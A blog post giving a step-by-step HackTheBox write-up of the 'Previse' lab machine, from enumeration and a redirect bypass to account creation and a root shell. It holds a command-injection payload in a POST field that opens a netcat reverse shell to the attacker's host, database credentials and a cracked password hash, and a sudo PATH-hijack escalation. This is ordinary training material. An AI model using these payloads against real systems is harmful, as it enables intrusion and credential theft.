<!DOCTYPE html>
<!--[if lt IE 7]>      <html lang="en" class="no-js lt-ie9 lt-ie8 lt-ie7" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/BlogPosting"> <![endif]-->
<!--[if IE 7]>         <html lang="en" class="no-js lt-ie9 lt-ie8" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/BlogPosting"> <![endif]-->
<!--[if IE 8]>         <html lang="en" class="no-js lt-ie9" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/BlogPosting"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en" class="no-js" prefix="og: http://ogp.me/ns#" itemscope itemtype="http://schema.org/BlogPosting"> <!--<![endif]-->
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>HTB: Previse</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Solution to the Previse VM">
<link rel="shortcut icon" href="/" type="">
<meta name="author" content="Pawel Mateja">
<meta name="copyright" content="Pawel Mateja">
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta property="og:site_name" content="Random stuff" />

<meta property="og:title" content="Htb: previse" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/htb-previse.html" />
<meta name="twitter:title" content="Htb: previse" />
<meta name="twitter:url" content="/htb-previse.html" />
<meta itemprop="url" content="/htb-previse.html" />
<meta property="og:description" content="Solution to the Previse VM" />
<meta name="twitter:description" content="Solution to the Previse VM" />
<meta property="og:article:published_time" content="2021-12-22" />
<meta property="og:article:author" content="Paweł Mateja" >
<meta property="og:article:tag" content="hackthebox">
<meta property="og:article:tag" content="htb">
<meta property="og:article:tag" content="solution">
<meta property="og:article:tag" content="hacking">

<link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Random stuff ATOM Feed"/>
<link href='//fonts.googleapis.com/css?family=Open+Sans:800italic' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/css/uikit.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/css/components/search.min.css">
<link rel="stylesheet" href="/theme/css/tipuesearch.css">
<link rel="stylesheet" href="/theme/css/solarized.css">
<link rel="stylesheet" href="/theme/css/main.css">

<script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
</head>
<body>
<!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->

<header class=" mg-header uk-navbar uk-navbar-attached">

    <div class="uk-container uk-container-center">

        <a class="mg-brand uk-navbar-brand uk-hidden-small" href="https://pmateja.github.io/">Random stuff</a>
        <div class="mg-tagline uk-navbar-content uk-hidden-small"></div>
        <a class="uk-navbar-toggle uk-visible-small" href="#mg-offcanvas" data-uk-offcanvas></a>
        <a class="mg-brand uk-navbar-brand uk-navbar-center uk-visible-small" href="https://pmateja.github.io/">Random stuff</a>

    </div>
</header>

<main class="mg-main">

<div class="uk-container uk-container-center">

    <div class="uk-grid" data-uk-grid-margin>

<div class="mg-container-social uk-width-medium-1-10 uk-hidden-small">


</div>

<div class="uk-width-medium-7-10">

    <article class="uk-article">
        <h1 class="uk-heading-large uk-article-title" itemprop="name">HTB: Previse</h1>
        <p class="uk-article-meta"><time datetime="2021-12-22" itemprop="datePublished">śro 22 grudnia 2021</time> in <a href="/category/hackthebox.html">HackTheBox</a></p>


        <p class="uk-article-lead" itemprop="description">Solution to the Previse VM</p>
        <section itemprop="articleBody"><h1>Foothold</h1>
<p>Let's start with some <strong>nmap</strong> enum:</p>
<div class="highlight"><pre><span></span><code>$ sudo nmap -sS -sV  <span class="m">10</span>.10.11.104  
Starting Nmap <span class="m">7</span>.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-12-15 <span class="m">22</span>:47 CET 
Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.11.104 
Host is up <span class="o">(</span><span class="m">0</span>.17s latency<span class="o">)</span>. 
Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span> 
PORT   STATE SERVICE VERSION 
<span class="m">22</span>/tcp open  ssh     OpenSSH <span class="m">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span> 
<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span> 
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">10</span>.15 seconds
</code></pre></div>

<p>Nothing special, just the basic ones: a ssh port (we will use it later) and a website. So lets take a look at it:</p>
<p><img alt="a7b6e0db6ec47598cfefda410ef8b323.png" src="images/htb-previse/a7b6e0db6ec47598cfefda410ef8b323.png"></p>
<p>Looks promising? We can -- and probably should -- try some sql injections, but it is not something, that will work. So what's next? Why not try some enumeration. We know already, that this page uses php and is not hiding file extensions. So thats easy:</p>
<div class="highlight"><pre><span></span><code>$ gobuster dir  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104 -x <span class="nv">php</span>                                           
<span class="o">===============================================================</span> 
Gobuster v3.1.0 
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span> 
<span class="o">===============================================================</span> 
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.11.104 
<span class="o">[</span>+<span class="o">]</span> Method:                  GET 
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span> 
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span> 
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0 
<span class="o">[</span>+<span class="o">]</span> Extensions:              php 
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span> 
<span class="o">===============================================================</span> 
<span class="m">2021</span>/12/15 <span class="m">22</span>:50:43 Starting gobuster in directory enumeration <span class="nv">mode</span> 
<span class="o">===============================================================</span> 
/download.php         <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">0</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span> 
/index.php            <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">2801</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span> 
/login.php            <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">2224</span><span class="o">]</span>                 
/files.php            <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">4914</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span> 
/header.php           <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">980</span><span class="o">]</span>                  
/nav.php              <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">1248</span><span class="o">]</span>                 
/footer.php           <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">217</span><span class="o">]</span>                  
/css                  <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">310</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.104/css/<span class="o">]</span> 
/status.php           <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">2966</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>               
/js                   <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">309</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.11.104/js/<span class="o">]</span>  
/logout.php           <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">0</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>                  
/accounts.php         <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">3994</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>               
/config.php           <span class="o">(</span>Status: <span class="m">200</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">0</span><span class="o">]</span>                                  
/logs.php             <span class="o">(</span>Status: <span class="m">302</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">0</span><span class="o">]</span> <span class="o">[</span>--&gt; login.php<span class="o">]</span>                  
/server-status        <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">277</span><span class="o">]</span>                               
</code></pre></div>

<p>Sweet! We can see here some pages that are redirected to <strong>login.php</strong>, as we are not logged in. Thats a bummer! Or is it not? We can try to access any of them by Burp/ZAP or just by curl, and see the result.</p>
<div class="highlight"><pre><span></span><code>$ curl -I <span class="m">10</span>.10.11.104/accounts.php
HTTP/1.1 <span class="m">302</span> Found
Date: Mon, <span class="m">20</span> Dec <span class="m">2021</span> <span class="m">22</span>:57:40 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>137fglha5g92u2jj5dph1daghf<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> <span class="m">08</span>:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</code></pre></div>

<p>Header doesn't look helpful, but as we try to just read the whole page outside of the browser, we can see, that along the redirection, there is also the whole page html code, and that is a major problem for the creator, and a gateway for us! </p>
<p>Just take a look at this part of accounts.php:</p>
<div class="highlight"><pre><span></span><code>        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">role</span><span class="o">=</span><span class="s">&quot;form&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;accounts.php&quot;</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-margin&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-inline&quot;</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-form-icon&quot;</span> <span class="na">uk-icon</span><span class="o">=</span><span class="s">&quot;icon: user&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-input&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Username&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-margin&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-inline&quot;</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-form-icon&quot;</span> <span class="na">uk-icon</span><span class="o">=</span><span class="s">&quot;icon: lock&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-input&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-margin&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-inline&quot;</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-form-icon&quot;</span> <span class="na">uk-icon</span><span class="o">=</span><span class="s">&quot;icon: lock&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;confirm&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-input&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;confirm&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Confirm Password&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-button uk-button-default&quot;</span><span class="p">&gt;</span>CREATE USER<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>What we need is just to send a POST request to accounts.php with data presented in this form to create our own user account:</p>
<div class="highlight"><pre><span></span><code>$ curl -X POST --data <span class="s2">&quot;username=hacker&amp;password=testing&amp;confirm=testing&amp;submit=submit&quot;</span> <span class="m">10</span>.10.11.104/accounts.php
</code></pre></div>

<p>As previously, sending that request will give as a 302 redirect header, but in the response content there again is a page with confirmation of our user registration!</p>
<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-alert-success&quot;</span> <span class="na">uk-alert</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;uk-alert-close&quot;</span> <span class="na">uk-close</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Success! User was added!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</code></pre></div>

<p>We can now log in to this account, yay!</p>
<p><img alt="09bc9824c05b313ddc64845fda3f0cc7.png" src="images/htb-previse/09bc9824c05b313ddc64845fda3f0cc7.png"></p>
<p>On page <strong>http://10.10.11.104/files.php</strong> we can find a downloadable file named <strong>SITEBACKUP.ZIP</strong>. You have to give it a look. Very close look. We will jump straight into the conclusion of this small research. There is a vulnerable file called <strong>logs.php</strong>, that contains this sweet line:</p>
<div class="highlight"><pre><span></span><code><span class="x">$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;);</span>
</code></pre></div>

<p>Can you see it? We can run a custom command with just adding something to the <strong>delim</strong> argument in a POST request! It is hard to find if it really work by trying to print result of additional command in response, but inserting something like "; sleep 10" will assure us, that it is working flawlessly! All in all, we can try many things, but what we really need is a remote shell. We will try a short and sweet version:</p>
<div class="highlight"><pre><span></span><code>$ curl -X POST --data <span class="s2">&quot;delim=space;nc -e /bin/sh </span><span class="si">${</span><span class="nv">YOUR_IP</span><span class="si">}</span><span class="s2"> 4321&quot;</span> --cookie <span class="s2">&quot;PHPSESSID=</span><span class="si">${</span><span class="nv">YOUR_SESSION</span><span class="si">}</span><span class="s2">&quot;</span> <span class="m">10</span>.10.11.104/logs.php
</code></pre></div>

<p>with a netcat instance started locally already:</p>
<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">4321</span>
</code></pre></div>

<p>BUM! We are inside!</p>
<p>First thing to do? Lets upgrade our remote shell a bit. We know already, that python is installed, so run </p>
<div class="highlight"><pre><span></span><code>$ python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</code></pre></div>

<p>Thats better. Now it is time for user part.</p>
<h1>User</h1>
<div class="highlight"><pre><span></span><code>www-data@previse:/var/www/html$ ls /home
ls /home
m4lwhere
www-data@previse:/var/www/html$ ls -l /home/m4lwhere     
ls -l /home/m4lwhere
total <span class="m">4</span>
-r-------- <span class="m">1</span> m4lwhere m4lwhere <span class="m">33</span> Dec <span class="m">20</span> <span class="m">22</span>:51 user.txt
</code></pre></div>

<p>We can see, that user account is named <strong>m4lwhere</strong> and it cointains the <strong>user.txt</strong> file, but access to this file is restricted. We will keep and remember the username for later use. At this moment the usual stuff can be done: <strong>LinEnum.sh</strong>, <strong>linpeas.sh</strong>, <strong>pspy64</strong>... It is always a good idea to run them, to gain more knowledge of work environment. But the right file for now is very close to us:</p>
<div class="highlight"><pre><span></span><code><span class="x">www-data@previse:/var/www/html$ cat config.php</span>
<span class="x">cat config.php</span>
<span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">connectDB</span><span class="p">(){</span>
    <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
    <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">&#39;mySQL_p@ssw0rd!:)&#39;</span><span class="p">;</span>
    <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;previse&#39;</span><span class="p">;</span>
    <span class="nv">$mycon</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$mycon</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>

<p>We can try those credentials to find something usefull in database:</p>
<div class="highlight"><pre><span></span><code>www-data@previse:/var/www/html$ mysql -u root --password<span class="o">=</span><span class="s1">&#39;mySQL_p@ssw0rd!:)&#39;</span> previse
&lt;ysql -u root --password<span class="o">=</span><span class="s1">&#39;mySQL_p@ssw0rd!:)&#39;</span> previse
mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
Reading table information <span class="k">for</span> completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
Your MySQL connection id is <span class="m">17</span>
Server version: <span class="m">5</span>.7.35-0ubuntu0.18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2000</span>, <span class="m">2021</span>, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.

mysql&gt; show tables<span class="p">;</span>
show tables<span class="p">;</span>
+-------------------+
<span class="p">|</span> Tables_in_previse <span class="p">|</span>
+-------------------+
<span class="p">|</span> accounts          <span class="p">|</span>
<span class="p">|</span> files             <span class="p">|</span>
+-------------------+
<span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span><span class="m">0</span>.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> * from accounts<span class="p">;</span>
<span class="k">select</span> * from accounts<span class="p">;</span>
+----+----------+------------------------------------+---------------------+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password                           <span class="p">|</span> created_at          <span class="p">|</span>
+----+----------+------------------------------------+---------------------+
<span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> m4lwhere <span class="p">|</span> <span class="nv">$1</span>$🧂llol<span class="nv">$DQpmdvnb7EeuO6UaqRItf</span>. <span class="p">|</span> <span class="m">2021</span>-05-27 <span class="m">18</span>:18:36 <span class="p">|</span>
<span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> hacker   <span class="p">|</span> <span class="nv">$1</span>$🧂llol$/YdK1dMEncJO3HmNPAVfN. <span class="p">|</span> <span class="m">2021</span>-12-20 <span class="m">23</span>:06:10 <span class="p">|</span>
+----+----------+------------------------------------+---------------------+
<span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span><span class="m">0</span>.00 sec<span class="o">)</span>

mysql&gt; 
</code></pre></div>

<p>Awesome, we have a hash value of <strong>m4lwhere</strong> user. At this moment we dont know, if it will be reusable, byt maybe... Lets try to crack this little weirdo hash with a famous wordlist:</p>
<div class="highlight"><pre><span></span><code>$ hashcat -m <span class="m">500</span> hash.txt /usr/share/wordlists/rockyou.txt

<span class="nv">$1</span>$🧂llol<span class="nv">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!
</code></pre></div>

<p>There it is, lets try to reuse it in ssh:</p>
<div class="highlight"><pre><span></span><code>$ ssh m4lwhere@10.10.11.104
</code></pre></div>

<p>BUM! We are in! And we can do the final step of this part, by typing:</p>
<div class="highlight"><pre><span></span><code>$ cat user.txt
</code></pre></div>

<h1>Root</h1>
<p>We can go back now to enumerating. Fast forwarding to result, found by linpeas.sh:</p>
<div class="highlight"><pre><span></span><code> -rwxr-xr-x <span class="m">1</span> root root <span class="m">486</span> Jun  <span class="m">6</span>  <span class="m">2021</span> /opt/scripts/access_backup.sh
 <span class="sb">```</span>

 Combined with:

 <span class="sb">```</span>bash
 m4lwhere@previse:~$ sudo -l
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> m4lwhere: 
User m4lwhere may run the following commands on previse:
    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/access_backup.sh
</code></pre></div>

<p>Give us a way to escalate. Lets take a look at content of this stript:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="c1"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span class="c1"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span class="c1"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&quot;yesterday&quot;</span> +%Y%b%d<span class="k">)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span class="k">$(</span>date --date<span class="o">=</span><span class="s2">&quot;yesterday&quot;</span> +%Y%b%d<span class="k">)</span>_file_access.gz
</code></pre></div>

<p>Can you see it already? At first glance it can look quite solid, BUT it is not, as the <strong>gzip</strong> command is executed without the full path, so we can alter the $PATH variable! We can start by creating a fake <strong>gzip</strong> command in a custom directory, like <strong>/tmp</strong>:</p>
<p>```  
#!/bin/bash 
cp /root/root.txt /tmp/root.txt 
chmod 666 /tmp/root.txt</p>
<div class="highlight"><pre><span></span><code><span class="ow">and</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nl">commands</span><span class="p">:</span><span class="w"></span>

<span class="err">```</span><span class="n">bash</span><span class="w"></span>
<span class="n">m4lwhere</span><span class="nv">@previse</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="k">PATH</span><span class="o">=/</span><span class="nl">tmp</span><span class="p">:</span><span class="err">$</span><span class="k">PATH</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">access_backup</span><span class="p">.</span><span class="n">sh</span><span class="w"> </span>
<span class="n">m4lwhere</span><span class="nv">@previse</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span>
<span class="err">{</span><span class="n">ROOT_FLAG</span><span class="err">}</span><span class="w"></span>
</code></pre></div>

<p>That's all, machine is rooted!</p></section>
        <hr class="uk-article-divider">
    </article>


</div>

        <div class="uk-width-medium-1-5 uk-hidden-small">

            <div class="uk-panel uk-panel-box">
                <form class="uk-search" action="search.html" data-uk-search>
                    <input class="uk-search-field tipue_search" type="search" name="q" id="tipue_search_input" autocomplete="off" placeholder="Search...">
                </form>
            </div>

            <div class="uk-panel uk-panel-box">
                <ul class="uk-nav uk-nav-side">
                    <li class="uk-nav-header">Categories</li>
                    <li ><a href="/category/food-pl.html">Food [PL]</a></li>
                    <li class="uk-active"><a href="/category/hackthebox.html">HackTheBox</a></li>
                    <li ><a href="/category/piwo-pl.html">Piwo [PL]</a></li>
                    <li ><a href="/category/python.html">Python</a></li>
                    <li ><a href="/category/snippets.html">Snippets</a></li>
                    <li class="uk-nav-header">Pages</li>



                    <li class="uk-nav-divider"></li>
                    <li ><a href="/archives.html">Archives</a></li>
                </ul>
            </div>

            <div class="uk-panel uk-panel-box">
                <h3 class="uk-panel-title">Receive Updates</h3>
                <a rel="alternate" type="application/atom+xml" href="/feeds/all.atom.xml" class="mg-feed"><i class="uk-icon-rss uk-icon-medium"></i> ATOM</a>
            </div>

            <div class="uk-panel uk-panel-box">
                <h3 class="uk-panel-title">Contacts</h3>
                <a class="mg-icon-link" href="https://github.com/pmateja">
                    <i class="uk-icon-Github uk-icon-medium"></i>
                </a>
                <a class="mg-icon-link" href="https://www.hackthebox.eu/home/users/profile/120322">
                    <i class="uk-icon-HackTheBox uk-icon-medium"></i>
                </a>
            </div>

        </div>

    </div>

</div>

</main>

<footer class="mg-footer">
    <div class="uk-container uk-container-center uk-text-center">

        <div class="mg-icons-small uk-subnav uk-visible-small">
            <li><a rel="alternate" type="application/atom+xml" href="/feeds/all.atom.xml" class="uk-icon-button uk-icon-rss"></a></li>
            <li>
                <a href="https://github.com/pmateja" class="uk-icon-button uk-icon-Github"></a>
            </li>
            <li>
                <a href="https://www.hackthebox.eu/home/users/profile/120322" class="uk-icon-button uk-icon-HackTheBox"></a>
            </li>
        </div>

        <div class="mg-author uk-panel">
            <p>&ldquo;Users and implementors should be aware that this protocol is not as<br />
   secure as Kerberos, and not as secure as any client-side private-key<br />
   scheme. Nevertheless it is better than nothing, better than what is<br />
   commonly used with telnet and ftp, and better than Basic<br />
   authentication<a href="https://tools.ietf.org/html/rfc2617" target="_blank">*</a>.&rdquo;</p>

            <p>Powered by <a href="http://blog.getpelican.com">Pelican</a>.<br class="uk-visible-small"> Theme <a href="https://github.com/lucachr/pelican-mg">mg</a> by <a href="https://github.com/lucachr">Luca Chiricozzi</a>.</p>
        </div>
    </div>
</footer>

<div id="mg-offcanvas" class="uk-offcanvas">
    <div class="uk-offcanvas-bar">

        <form class="uk-search" action="search.html" data-uk-search>
            <input class="uk-search-field" type="search" name="q" id="tipue_search_input" autocomplete="off" placeholder="Search...">
        </form>

        <ul class="uk-nav uk-nav-offcanvas" data-uk-nav>
            <li class="uk-nav-header">Categories</li>
            <li ><a href="/category/food-pl.html">Food [PL]</a></li>
            <li class="uk-active"><a href="/category/hackthebox.html">HackTheBox</a></li>
            <li ><a href="/category/piwo-pl.html">Piwo [PL]</a></li>
            <li ><a href="/category/python.html">Python</a></li>
            <li ><a href="/category/snippets.html">Snippets</a></li>
            <li class="uk-nav-header">Pages</li>


            <li class="uk-nav-divider"></li>
            <li><a href="/">Archives</a></li>
        </ul>
    </div>
</div>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.2.min.js"><\/script>')</script>
<script src="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/js/uikit.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/uikit/2.23.0/js/components/search.min.js"></script>
<script src="/theme/js/tipuesearch_set.js"></script>
<script src="/theme/js/tipuesearch.js"></script>
